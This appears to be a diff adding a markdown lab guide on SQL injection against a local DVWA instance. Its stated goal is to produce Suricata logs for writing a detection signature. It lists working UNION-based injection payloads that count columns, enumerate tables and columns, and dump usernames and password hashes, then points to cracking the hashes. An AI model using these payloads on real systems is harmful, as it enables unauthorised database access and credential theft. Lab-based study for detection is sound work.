@@ -1,0 +1,74 @@
+# SQL Injection
+* In this section we will simulate database dump and generate necessary logs, so we can analyse patterns and write a signature to prevent it.
+# Resources&Tools
+* DVWA
+* Burp Suite
+## Where to learn SQLi
+* If you dont know how to exploit SQL injection and use Burp Suite, you can learn all basics in [PortSwigger Academy](https://portswigger.net/web-security), they provide detailed explanations and labs for free. Important note, dont try to learn everything about SQLi, learn till you finish UNION attacks section.
+## Pre-setup
+* Before exloiting SQLi, we need to turn on monitoring of logs in Suricata, so it will record eveything we have done, and we will not be searching for necessary logs among dozens of them.
+* SSH to you server and run tail command. Make sure to filter only for http packets, so we can avoid statistic logs from Suricata, and remove unnecessary noise.
+```
+tail -f /var/log/suricata/eve.json | jq 'select(.event_type == "http")'
+```
+* Also make sure to set DVWA on low level
+```
+In login page by default 
+Username: admin
+Password: password
+```
+* Login to DVWA and go to sql injection section
+* By using burp suite turn interception on, then try to write anything in user id: for example apple and submit
+![Example](./screenshots/Screenshot%202026-01-24%20at%2019.49.39.png)
+* After submit proxy will recive the request packet
+![Proxy catched the request packet](./screenshots/Screenshot%202026-01-24%20at%2019.51.36.png)
+* Now send the packet to Repeater and switch off interception
+![Send to Repeater](./screenshots/Screenshot%202026-01-24%20at%2019.51.40.png)
+Go to Repeater, and there you will get see this kind of a packet
+![Example](./screenshots/Screenshot%202026-01-24%20at%2019.55.18.png)
+* Look at the request packet:
+```
+GET /vulnerabilities/sqli/?id=apple&Submit=Submit HTTP/1.1
+Host: 165.232.172.9:4280
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://165.232.172.9:4280/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=626a226ff8e12174f5ee07bd8332bd61; security=low
+Connection: keep-alive
+```
+* First we have to find out how many columns the DataBase has For this we will use `order by`
+* `'+order+by+1--+` inject this after apple so it looks like this:
+```
+GET /vulnerabilities/sqli/?id=apple'+order+by+1--+&Submit=Submit HTTP/1.1
+```
+* Increase the number "1" by +1 till error will pop up.
+In my case `order by 3` showed error, which means DataBase has 2 columns
+* Since we know the number of columns, we can start searching for the table with credentials, by injecting
+```
+'+union+select+table_name,null+from+information_schema.tables+where+table_schema+=+database()--+`
+```
+* This will return table names, we should find among them the one with credentials
+![Table names of DataBase](./screenshots/Screenshot%202026-01-24%20at%2020.04.17.png) 
+* As we can see there are multiple tables with names:
+```
+users
+security_log
+access_log
+guestbook
+```
+* `users` table should contain usernames and passwords, lets look for column names of this table by injecting: 
+```
+'+union+select+column_name,null+from+information_schema.columns+where+table_name+=+'users'--+
+```
+![Column names of users Table](./screenshots/Screenshot%202026-01-24%20at%2020.03.11.png)
+* As we can see there are a lot of columns but most interesting for us are: `user` and `password` columns, lets return them by injecting this:
+```
+'+union+select+user,password+from+users--+
+```
+![Usernames and Passwords](./screenshots/Screenshot%202026-01-24%20at%2020.05.15.png)
+* We will get all login credentials, though passwords are hashed, we can break them with crack station, just paste hashed passwords and it will crack them.
+![CrackStation](./screenshots/Screenshot%202026-01-24%20at%2020.06.53.png)
+
